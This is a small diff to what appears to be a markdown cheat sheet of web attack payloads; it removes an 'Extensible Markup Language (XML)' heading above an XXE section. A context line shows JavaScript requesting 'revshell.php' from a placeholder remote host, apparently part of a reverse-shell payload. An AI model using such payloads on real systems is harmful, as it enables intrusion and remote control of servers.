@@ -284,8 +284,6 @@ req.open('GET',"http://<RHOST>/revshell.php");
 req.send();
 ```
 
-### Extensible Markup Language (XML)
-
 #### Extensible Markup Language (XML) External Entity (XXE)
 
 ##### Request
